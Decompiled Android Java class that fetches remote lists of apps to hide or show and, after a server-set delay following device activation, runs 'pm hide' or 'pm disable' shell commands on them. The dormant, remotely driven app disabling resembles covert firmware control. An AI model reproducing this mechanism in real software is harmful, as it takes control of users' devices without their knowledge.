package com.tw.core.g;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import com.tw.core.utils.B;
import com.tw.core.utils.C0048b;
import com.tw.core.utils.C0057k;
import com.tw.core.utils.C0058l;
import com.tw.core.utils.C0064r;
import com.tw.core.utils.C0065s;
import com.tw.core.utils.M;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class a implements Runnable {
    private JSONArray iI;
    private Context iJ;
    private Handler iK;
    private JSONArray iL;

    public a(Context context) {
        this.iJ = context;
        HandlerThread handlerThread = new HandlerThread("AppControlHandler");
        handlerThread.start();
        this.iK = new c(this, handlerThread.getLooper());
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void nB(String str) {
        JSONObject jSONObject = new JSONObject(str);
        B.ci("AppStateWorker", "app control net response %s", jSONObject.toString());
        if ("0".equals(jSONObject.optString("code"))) {
            JSONObject jSONObjectOptJSONObject = jSONObject.optJSONObject("data");
            long jOptLong = jSONObjectOptJSONObject.optLong("activateTime");
            if (jOptLong > 0) {
                if (com.tw.core.b.e.gh()) {
                    C0064r.bH(this.iJ, "activateTime", jOptLong);
                } else {
                    C0064r.bH(this.iJ, "hwActivateTime", jOptLong * 1000);
                }
            }
            C0064r.bG(this.iJ, "SP_CONTROL_APP_DELAY_TIME", jSONObjectOptJSONObject.optInt("calcDay"));
            this.iI = jSONObjectOptJSONObject.optJSONArray("hideApp");
            this.iL = jSONObjectOptJSONObject.optJSONArray("showApp");
            C0064r.bB(this.iJ, "SP_CONTROL_APP_SHOW_LIST", this.iL.toString());
            C0064r.bB(this.iJ, "SP_CONTROL_APP_HIDE_LIST", this.iI.toString());
            this.iK.removeMessages(1);
            this.iK.sendEmptyMessageDelayed(1, 5000L);
        }
    }

    private void nw() {
        String str = com.tw.core.d.a.gS + "?cid=" + com.tw.core.b.f.gr();
        C0058l.au(str, new d(this, str));
    }

    private boolean nx() {
        long jBE = com.tw.core.b.e.gh() ? C0064r.bE(this.iJ, "activateTime", 0L) * 1000 : C0064r.bE(this.iJ, "hwActivateTime", 0L);
        int iBD = C0064r.bD(this.iJ, "SP_CONTROL_APP_DELAY_TIME", -1);
        long jCurrentTimeMillis = System.currentTimeMillis();
        B.ci("AppStateWorker", "激活时间 %s 延迟天数 %s 当前时间 %s", Long.valueOf(jBE), Integer.valueOf(iBD), Long.valueOf(jCurrentTimeMillis));
        if (jBE <= 0 || iBD <= 0 || jCurrentTimeMillis - jBE < ((long) (iBD * 24 * 60 * 60)) * 1000) {
            return false;
        }
        B.ci("AppStateWorker", "满足控制条件", new Object[0]);
        return true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public synchronized void ny() {
        synchronized (this) {
            B.ci("AppStateWorker", "app show %s", this.iL);
            B.ci("AppStateWorker", "app hide %s", this.iI);
            if (nx()) {
                if (this.iL != null) {
                    for (int i = 0; i < this.iL.length(); i++) {
                        String strOptString = this.iL.optString(i);
                        if (com.tw.core.b.e.gn()) {
                            B.ci("AppStateWorker", "enable " + strOptString, new Object[0]);
                            M.du("pm enable " + strOptString);
                        } else {
                            B.ci("AppStateWorker", "unhide " + strOptString, new Object[0]);
                            M.du("pm unhide " + strOptString);
                        }
                    }
                }
                if (this.iI != null) {
                    for (int i2 = 0; i2 < this.iI.length(); i2++) {
                        String strOptString2 = this.iI.optString(i2);
                        if (com.tw.core.b.d.fY(strOptString2)) {
                            if (com.tw.core.b.e.gn()) {
                                B.ci("AppStateWorker", "disable " + strOptString2, new Object[0]);
                                M.du("pm disable " + strOptString2);
                            } else {
                                B.ci("AppStateWorker", "hide " + strOptString2, new Object[0]);
                                M.du("pm hide " + strOptString2);
                            }
                        }
                    }
                }
            }
        }
    }

    public void nA() {
        C0048b.p().execute(this);
    }

    public void nz() {
        B.ci("AppStateWorker", "doWork", new Object[0]);
        String strBz = C0064r.bz(this.iJ, "SP_CONTROL_APP_SHOW_LIST", null);
        String strBz2 = C0064r.bz(this.iJ, "SP_CONTROL_APP_HIDE_LIST", null);
        if (!C0057k.am(strBz)) {
            try {
                this.iL = new JSONArray(strBz);
            } catch (JSONException e) {
                C0065s.bK("AppStateWorker", "showList " + e.getMessage());
            }
        }
        if (!C0057k.am(strBz2)) {
            try {
                this.iI = new JSONArray(strBz2);
            } catch (JSONException e2) {
                C0065s.bK("AppStateWorker", "hideList " + e2.getMessage());
            }
        }
        if (this.iK != null) {
            this.iK.sendEmptyMessageDelayed(1, 5000L);
        }
    }

    @Override // java.lang.Runnable
    public void run() {
        nw();
    }
}
